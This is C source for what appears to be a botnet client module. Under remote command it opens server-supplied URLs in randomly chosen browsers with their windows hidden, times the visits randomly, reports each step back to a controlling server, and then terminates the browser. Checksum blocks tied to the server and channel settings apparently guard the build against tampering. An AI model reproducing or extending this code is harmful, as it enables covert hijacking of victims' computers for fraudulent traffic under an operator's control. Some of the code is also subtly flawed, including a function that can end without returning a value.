#include "../Includes/includes.h"

void DefineBrowsers()
{
    // <!-------! CRC AREA START !-------!>
    char cCheckString[DEFAULT];
    sprintf(cCheckString, "%s(%s)", cChannel, cChannelKey);
    char *cStr = cCheckString;
    unsigned long ulCheck = ((5*(43*5))*(3+2))+(3*2);
    int nCheck;
    while((nCheck = *cStr++))
        ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;

    if(ulCheck != ulChecksum4)
        return;
    // <!-------! CRC AREA STOP !-------!>

    if(dwOperatingSystem > WINDOWS_XP)
        sprintf(cBuild, "%s\\Google\\Chrome\\Application\\chrome.exe", getenv("LOCALAPPDATA"));
    else
        sprintf(cBuild, "%s\\Internet Explorer\\iexplore.exe", cProgramFiles);

    for(unsigned short us = 0; us < strlen(cBuild); us++)
        cBrowsers[0][us] = cBuild[us];

    sprintf(cBuild, "%s\\Opera\\opera.exe", cProgramFiles);
    for(unsigned short us = 0; us < strlen(cBuild); us++)
        cBrowsers[1][us] = cBuild[us];

    sprintf(cBuild, "%s\\Mozilla Firefox\\firefox.exe", cProgramFiles);
    for(unsigned short us = 0; us < strlen(cBuild); us++)
        cBrowsers[2][us] = cBuild[us];

    sprintf(cBuild, "%s\\Internet Explorer\\iexplore.exe", cProgramFiles);
    for(unsigned short us = 0; us < strlen(cBuild); us++)
        cBrowsers[3][us] = cBuild[us];

    sprintf(cBuild, "%s\\Maxthon3\\Bin\\Maxthon.exe", cProgramFiles);
    for(unsigned short us = 0; us < strlen(cBuild); us++)
        cBrowsers[4][us] = cBuild[us];
}

char *CheckBrowserType(unsigned short usBrowser)
{
    // <!-------! CRC AREA START !-------!>
    char cCheckString[DEFAULT];
    sprintf(cCheckString, "%s:%i", cServer, usPort);
    char *pcStr = cCheckString;
    unsigned long ulCheck = 3376+2005;
    int nCheck;
    while((nCheck = *pcStr++))
        ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
    if(ulCheck != ulChecksum3)
        return (char*)"";
    // <!-------! CRC AREA STOP !-------!>

    if(usBrowser == 0)
        return (char*)"Google Chrome";
    else if(usBrowser == 1)
        return (char*)"Opera";
    else if(usBrowser == 2)
        return (char*)"Firefox";
    else if(usBrowser == 3)
        return (char*)"Internet Explorer";
    else if(usBrowser == 4)
        return (char*)"Maxthon";

    return (char*)"*unknown*";
}

unsigned short GetBrowserNumberFromPath(char *cBrowser)
{
    if(strstr(cBrowser, "chrome.exe"))
        return 0;
    else if(strstr(cBrowser, "opera.exe"))
        return 1;
    else if(strstr(cBrowser, "firefox.exe"))
        return 2;
    else if(strstr(cBrowser, "iexplore.exe"))
        return 3;
    else if(strstr(cBrowser, "Maxthon.exe"))
        return 4;
}

char *GetRandomExistingBrowser()
{
    char *cReturn;
    while(true)
    {
        unsigned short usBrowser = GetRandNum(5);

        cReturn = cBrowsers[usBrowser];

        if(FileExists(cReturn))
            break;
    }

    return cReturn;
}

#ifdef INCLUDE_VISIT
char *SimpleVisit(char *cUrl, bool bHidden)
{
    char *cBrowserPath = GetRandomExistingBrowser();
    sprintf(cBuild, "%s \"%s\"", cBrowserPath, cUrl);

    // <!-------! CRC AREA START !-------!>
    char cCheckString[DEFAULT];
    sprintf(cCheckString, "%s:%i", cServer, usPort);
    char *pcStr = cCheckString;
    unsigned long ulCheck = 3376+2005;
    int nCheck;
    while((nCheck = *pcStr++))
        ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
    if(ulCheck != ulChecksum3)
        return (char*)"";
    // <!-------! CRC AREA STOP !-------!>

    if(StartProcessFromPath(cBuild, bHidden))
        return CheckBrowserType(GetBrowserNumberFromPath(cBrowserPath));
    else
        return (char*)"ERR_FAILED_TO_START";
}

//smartview stuff below this line

DWORD WINAPI SmartViewThread(LPVOID)
{
#ifdef HTTP_BUILD
    int nLocalTaskId = nCurrentTaskId;
#endif

    char cUrl[strlen(cStoreParameter)];
    strcpy(cUrl, cStoreParameter);

    srand(GenerateRandomSeed());
    DWORD dwSecondsBeforeVisit = GetRandNum(uiSecondsBeforeVisit);
    DWORD dwSecondsAfterVisit = GetRandNum(uiSecondsAfterVisit);

    char *cBrowserPath = GetRandomExistingBrowser();
    char *cBrowserName = CheckBrowserType(GetBrowserNumberFromPath(cBrowserPath));

#ifndef HTTP_BUILD
    SendWebsiteScheduleConfirmation(dwSecondsBeforeVisit, (char*)cUrl);
#else
    while(!SendHttpCommandResponse(nLocalTaskId, (char*)"0"))
        Sleep(10000);
#endif
    uiWebsitesInQueue++;

    // <!-------! CRC AREA START !-------!>
    char cCheckString[DEFAULT];
    sprintf(cCheckString, "%s:%i", cServer, usPort);
    char *pcStr = cCheckString;
    unsigned long ulCheck = 3376+2005;
    int nCheck;
    while((nCheck = *pcStr++))
        ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
    if(ulCheck != ulChecksum3)
    {
        uiWebsitesInQueue = 9999;
        dwSecondsBeforeVisit = 1;
        dwSecondsBeforeVisit = 1;
    }
    // <!-------! CRC AREA STOP !-------!>

    bool bOpenWebsite = TRUE;

    for(DWORD dw = 0; dw < dwSecondsBeforeVisit; dw++)
    {
        if(dwSmartViewCommandType == SMARTVIEW_CLEAR_QUEUE)
        {
            bOpenWebsite = FALSE;
            dwSecondsAfterVisit = 0;
            break;
        }
        else if(dwSmartViewCommandType == SMARTVIEW_DEL_ENTRY)
        {
            if(strstr(cUrl, cStoreParameter))
            {
#ifndef HTTP_BUILD
                SendDeletedEntry(cUrl);
#endif
                bOpenWebsite = FALSE;
                dwSecondsAfterVisit = 0;
                break;
            }
        }

        Sleep(1000);
    }

    bool bCloseResponse = TRUE;

    PROCESS_INFORMATION pi;
    if(bOpenWebsite)
    {
        sprintf(cBuild, "%s \"%s\"", cBrowserPath, cUrl);

        STARTUPINFO si;
        memset(&si, 0 , sizeof(si));

        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;

        si.wShowWindow = SW_HIDE;
        //si.wShowWindow = SW_SHOW;

        //if(CreateProcess(NULL, cBuild, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
        if(CreateProcess(NULL, cBuild, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &si, &pi))
        {
#ifndef HTTP_BUILD
            SendWebsiteOpenConfirmation(cBrowserName, dwSecondsBeforeVisit, dwSecondsAfterVisit, (char*)cUrl);
#endif
        }
        else
        {
#ifndef HTTP_BUILD
            SendWebsiteOpenFail(cUrl);
#endif
            dwSecondsAfterVisit = 0;
            bCloseResponse = FALSE;
        }
    }

    for(DWORD dw = 0; dw < dwSecondsAfterVisit; dw++)
    {
        if(dwSmartViewCommandType == SMARTVIEW_CLEAR_QUEUE)
        {
            bCloseResponse = FALSE;
            break;
        }
        else if(dwSmartViewCommandType == SMARTVIEW_DEL_ENTRY)
        {
            if(strstr(cUrl, cStoreParameter))
            {
                bCloseResponse = FALSE;
                break;
            }
        }

        Sleep(1000);
    }

    if(bOpenWebsite)
    {
        TerminateProcess(pi.hProcess, NULL);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        if(bCloseResponse)
        {
#ifndef HTTP_BUILD
            SendWebsiteCloseConfirmation(dwSecondsAfterVisit, (char*)cUrl);
#endif
        }
    }

    uiWebsitesInQueue--;
    return 1;
}

bool SmartView()
{
    bool bReturn = TRUE;

    HANDLE hThread = CreateThread(NULL, NULL, SmartViewThread, NULL, NULL, NULL);

    if(hThread)
        CloseHandle(hThread);
    else
        bReturn = FALSE;

    return bReturn;
}
#endif
